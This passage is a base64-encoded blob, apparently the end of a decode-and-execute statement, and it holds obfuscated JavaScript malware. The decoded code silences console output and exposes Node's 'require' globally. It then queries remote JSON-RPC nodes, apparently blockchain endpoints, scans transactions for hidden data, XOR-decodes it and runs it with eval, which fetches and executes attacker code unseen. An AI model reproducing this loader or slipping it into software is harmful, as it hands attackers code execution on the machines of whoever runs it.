Dg0WzB4ZV0sXyRfZTg4NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U4ODRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTg4NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTg4NFsweDFdKSgpKTtnbG9iYWxbXyRfZTg4NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTg4NFsweDEyXSl7Z2xvYmFsW18kX2U4ODRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U4ODRbMHgwXSl7Z2xvYmFsW18kX2U4ODRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lODg0WzB4MF0pe2dsb2JhbFtfJF9lODg0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBfJF81MDBkPShmdW5jdGlvbihkLGspe3ZhciBxPWQubGVuZ3RoO3ZhciBvPVtdO2Zvcih2YXIgdD0wO3Q8IHE7dCsrKXtvW3RdPSBkLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDwgcTt0Kyspe3ZhciBqPWsqICh0KyAxOTUpKyAoayUgNTIxNDQpO3ZhciBmPWsqICh0KyA1MzgpKyAoayUgNTExNzEpO3ZhciBpPWolIHE7dmFyIHM9ZiUgcTt2YXIgZz1vW2ldO29baV09IG9bc107b1tzXT0gZztrPSAoaisgZiklIDQwNzY3ODB9O3ZhciByPVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgdT0nJzt2YXIgaD0nXHgyNSc7dmFyIGU9J1x4MjNceDMxJzt2YXIgbj0nXHgyNSc7dmFyIHc9J1x4MjNceDMwJzt2YXIgbT0nXHgyMyc7dmFyIHk9J1x4MjNceDMyJztyZXR1cm4gby5qb2luKHUpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocikubWFwKGZ1bmN0aW9uKGYpe3JldHVybiBmLnNwbGl0KHkpLmpvaW4ocikuc3BsaXQoZSkuam9pbihuKS5zcGxpdCh3KS5qb2luKG0pfSl9KSgicmVmZWVlOWVkJSUldGliZGElY2lzLG5vIGZwbGggbEV2ZSVhcm9hd3RpQSVucnNwZS50JXMlZ1ViLS5jcmNiQ28lY2Fjb24ldDlkdWMlP3JidXByZ3R0cGhlaHJrdD9kdGJpZHQlLiVTbyVyLm9zcCVfdGxtc3BjcmVpdGdpeGklQiVwbiV0QiV0aSBTYiBjbmlnaXV0IGFtdCA1YnhhcmwlZCVvbixTJW9pbTlsbnJuY214bWVvdnNldXNwdm5yZW9Dcm95ZXVpZ2F1Y2YldWR1dCVpX29lYXJlZXZ1b2h1OElhJXg1dCVmZ3Nqb2VldG5wdGUlYXMgb2FmZiVhZ2VsY29pcG5lZCVuOW5nJWVuJW5vc3Ulb1A+ZTd1M0R0dWU4bmVlTm50ZWZpdDh0bXBidG9vLiAgYS1ub3dOOW9zbjBhaXFycy4laW5OaXJrNyVpQyVyZE8tcm0tZ21icm8ldSVzY2RnbGwlbzUgJXRwJSBhJW9wbGlldGQuaHR0YW5iJTBuaG91dHJ0aHRiJWEuZGgwdWklZWJ0biUuaGxsaWEubnIlX3Rhb2RsT3R0JXJtYW5lJW91c21oZ291ciBpblZvJXBpb3UxY2dyb2hpdHRlc2NkZGlycHRhcmxhY19pbm1lci4lZHdjYiVjeGluLnN0LWUxJSBiI2VQaXJubDh1byVhZmYldEJtcmJlbnQgYmVic2VlMGUlIGVsdG5PY2xvciVyb2dpbmklJWV0ZW5wcnN0ZG0lU2Z0ZW4lbWxsZ3QlcnNnZXAlb3V0YyVDcG5ydT5yZWUuZ2luZWxvdWhlcCVrZXJvcCV4aWVuLnIleWQ2bG5jbmVvJTVuc2FlZCVyaXJkY2VzZWMlRXRzdHRKdGxUVGFkLmJzYUV5ZWRlaXBucm5iZXNzbHJDb2VudG5jcmNlZyVuYVNlaWwyY2l1ZSUlZWl4JWlsciVlbWxyYWNjZUptNnRhZnUiLDIzODQ2MjIpO2Z1bmN0aW9uIF8kYWYyMzczNjgoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfNTAwZFsweDExXSYmICB0eXBlb2YgYiE9PSBfJF81MDBkWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF81MDBkWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kXzUwMGRbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3MzY5KG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kXzUwMGRbMHgxMF1dPT0gXyRfNTAwZFsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF81MDBkWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kXzUwMGRbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfNTAwZFsweDE2XV1dPT0gXyRfNTAwZFsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kXzUwMGRbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwZFsweDNdLF8kXzUwMGRbMHg0XSxfJF81MDBkWzB4NV0sXyRfNTAwZFsweDZdLF8kXzUwMGRbMHg3XSxfJF81MDBkWzB4OF0sXyRfNTAwZFsweDldLF8kXzUwMGRbMHhhXSxfJF81MDBkWzB4Yl0sXyRfNTAwZFsweGNdLF8kXzUwMGRbMHhkXSxfJF81MDBkWzB4ZV0sXyRfNTAwZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwZFsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzM2ODtfJGpzb0l0ZXI9IF8kYWYyMzczNjk7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfNTAwZFsweDE5XV07dmFyIGU9XyRfNTAwZFsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF81MDBkWzB4MWNdXSlbXyRfNTAwZFsweDFiXV0oKTt0cnl7aWYoaVtfJF81MDBkWzB4MWRdXSYmIHQtIGlbXyRfNTAwZFsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfNTAwZFsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF81MDBkWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDFmXV0oe2pzb25ycGM6XyRfNTAwZFsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kXzUwMGRbMHgyMV19O3ZhciBvPXUoXyRfNTAwZFsweDI5XSlbXyRfNTAwZFsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF81MDBkWzB4MjNdO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDI3XV0obilbXyRfNTAwZFsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF81MDBkWzB4MjJdXShfJF81MDBkWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfNTAwZFsweDJhXV0odCk7b1tfJF81MDBkWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF81MDBkWzB4MmNdLF8kXzUwMGRbMHgyZF0sXyRfNTAwZFsweDJlXSxfJF81MDBkWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF81MDBkWzB4MzFdXSgpKVtfJF81MDBkWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfNTAwZFsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18xW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgdFtfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF81MDBkWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfNTAwZFsweDM4XV1bXyRfNTAwZFsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF81MDBkWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kXzUwMGRbMHgzMV1dKCkpW18kXzUwMGRbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF81MDBkWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNhXV1bXyRfNTAwZFsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kXzUwMGRbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfNTAwZFsweDMzXV0pe18kaXRfNzZjZV8yW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgcltfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kXzUwMGRbMHgzOF1dO3doaWxlKGU8IG5bXyRfNTAwZFsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kXzUwMGRbMHgzYV1dKG5bZV1bXyRfNTAwZFsweDQwXV1bXyRfNTAwZFsweDNmXV0oMiksXyRfNTAwZFsweDQxXSlbXyRfNTAwZFsweDM3XV0oXyRfNTAwZFsweDNlXSlbXyRfNTAwZFsweDNkXV0oXyRfNTAwZFsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kXzUwMGRbMHg0Ml0sXyRfNTAwZFsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMxXV0oKSlbXyRfNTAwZFsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18zW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfNTAwZFsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfNTAwZFsweDEwXV07dmFyIGU9XyRfNTAwZFsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF81MDBkWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kXzUwMGRbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfNTAwZFsweDQ3XV1bXyRfNTAwZFsweDQ2XV0obltfJF81MDBkWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfNTAwZFsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfNTAwZFsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfNTAwZFsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kXzUwMGRbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kXzUwMGRbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfNTAwZFsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
